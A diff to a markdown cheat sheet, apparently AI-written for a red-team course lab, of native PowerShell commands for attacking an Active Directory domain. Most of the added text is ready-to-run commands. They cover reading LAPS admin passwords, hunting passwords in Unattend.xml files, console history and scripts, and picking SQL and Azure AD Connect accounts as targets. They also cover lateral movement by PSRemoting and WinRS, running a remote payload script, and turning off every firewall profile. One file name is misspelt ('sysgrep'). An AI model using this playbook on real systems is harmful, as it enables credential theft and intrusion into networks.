@@ -1,5 +1,3 @@
-Voici une phase de reconnaissance utilisant **uniquement PowerShell** (principalement le module Microsoft Active Directory et des commandes natives), sans utiliser PowerView, basée sur les sources fournies.
-
 ### 1. Chargement des Modules
 Si les outils RSAT ne sont pas installés mais que vous avez accès à la DLL, vous pouvez importer le module manuellement,.
 
@@ -103,4 +101,160 @@ Get-Process
 
 # Lister les connexions réseau actives
 Get-NetTCPConnection
+```
+
+
+
+Here are the commands for the remaining phases (Advanced Recon, Local Enumeration/Defense Evasion, Lateral Movement, and Credential Hunting) using **only native PowerShell** and the **Active Directory Module**, strictly excluding PowerView, based on your sources.
+
+### 1. Advanced Reconnaissance (GPO, LAPS, SQL)
+
+**Enumerating Group Policy & AppLocker**
+Identifying security controls enforced by GPO (e.g., AppLocker) using native cmdlets and registry queries.
+
+```powershell
+# Get AppLocker Policy (Effective)
+Get-AppLockerPolicy –Effective
+
+# Get AppLocker Rule Collections
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# Enumerate Registry for AppLocker Policies
+Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
+Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
+```
+
+**Enumerating LAPS (Local Admin Password Solution)**
+Checking if LAPS is deployed and identifying privileged attributes without PowerView.
+
+```powershell
+# Check for LAPS Schema Object (confirms LAPS existence in domain)
+Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=techcorp,DC=local'
+
+# Find Computers with LAPS enabled (checking Expiration Time attribute)
+Get-ADComputer -Filter {ms-Mcs-AdmPwdExpirationTime -like "*"} -Properties ms-Mcs-AdmPwdExpirationTime
+
+# Retrieve LAPS Password (if you have permissions)
+# Note: Requires AD Module; replaces Get-AdmPwdPassword if module missing
+Get-ADComputer -Identity "TargetComputer" -Properties ms-mcs-admpwd | Select-Object Name, ms-mcs-admpwd
+```
+
+**Enumerating SQL Servers via SPN**
+Finding SQL instances using Service Principal Names.
+
+```powershell
+# Find MSSQL Service Accounts via SPN
+Get-ADUser -Filter {ServicePrincipalName -like "*mssql*"} -Properties ServicePrincipalName
+```
+
+### 2. Local Enumeration & Defense Evasion
+
+**Enumerating Protection Mechanisms (Defender/AMSI)**
+Checking the state of Windows Defender and language modes.
+
+```powershell
+# Check Windows Defender Preferences
+Get-MpPreference
+
+# Check PowerShell Language Mode (Constraint Language Mode check)
+$ExecutionContext.SessionState.LanguageMode
+```
+
+**Searching for Sensitive Files (Passwords/Config)**
+Hunting for credentials in standard Windows files natively.
+
+```powershell
+# Recursively search for Unattend.xml files (often contain base64 creds)
+Get-ChildItem -path C:\Windows\Panther\* -Recurse -Include *Unattend.xml*
+
+# Search for Sysprep files
+Get-ChildItem -path C:\Windows\system32\* -Recurse -Include *sysgrep.xml*, *sysgrep.inf*
+
+# Search for PowerShell Console History
+Get-Childitem -Path C:\Users\* -Force -Include *ConsoleHost_history* -Recurse -ErrorAction SilentlyContinue
+
+# Search for specific strings (e.g., "password") in scripts
+Get-ChildItem -path C:\* -Recurse -Include *.xml,*.ps1,*.bat,*.txt | Select-String "password"
+```
+
+### 3. Lateral Movement (Native PowerShell)
+
+**PowerShell Remoting (WinRM)**
+Moving laterally without external tools using native PSRemoting.
+
+```powershell
+# Create a Credential Object
+$pass = ConvertTo-SecureString 'Password123' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ("DOMAIN\User", $pass)
+
+# Create a Persistent Session
+$session = New-PSSession -ComputerName "TargetMachine" -Credential $cred
+
+# Enter Interactive Session
+Enter-PSSession $session
+
+# Execute Commands Remotely (Non-interactive)
+Invoke-Command -Scriptblock {Get-Process} -Session $session
+
+# Execute Local Script on Remote Machine
+Invoke-Command -FilePath C:\Scripts\Payload.ps1 -ComputerName "TargetMachine"
+```
+
+**WMI & Network Management**
+Using WMI for reconnaissance and firewall manipulation.
+
+```powershell
+# Query Operating System Info via WMI
+Get-WmiObject -Class win32_operatingsystem -ComputerName "TargetMachine"
+
+# Disable Firewall (Requires Admin)
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
+
+**Native WinRS (Windows Remote Shell)**
+Alternative to PowerShell Remoting if WinRM is enabled.
+
+```powershell
+# Execute command via WinRS
+winrs -remote:TargetServer -u:DOMAIN\User -p:Password hostname
+```
+
+### 4. Privilege Escalation & Persistence (Domain Level)
+
+**Azure AD Connect Enumeration**
+Identifying accounts related to Azure AD Connect (often targets for DCSync).
+
+```powershell
+# Find MSOL Accounts (AD Connect Sync Accounts)
+Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description
+```
+
+**Password Policy Enumeration**
+Checking for Fine Grained Password Policies (PSO) that might be weaker than the domain default.
+
+```powershell
+# Get all Fine Grained Password Policies
+Get-ADFineGrainedPasswordPolicy -Filter *
+
+# Get Resultant Policy for a specific user
+Get-ADUserResultantPasswordPolicy -Identity "TargetUser"
+```
+
+**Group Recursion**
+Mapping nested group memberships without PowerView.
+
+```powershell
+# Function to get recursive group membership using native AD Module
+function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) {
+    $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname)
+    $groups
+    if ($groups.count -gt 0) {
+        foreach ($group in $groups) {
+            Get-ADPrincipalGroupMembershipRecursive $group
+        }
+    }
+}
+
+# Usage
+Get-ADPrincipalGroupMembershipRecursive 'TargetUser'
 ```
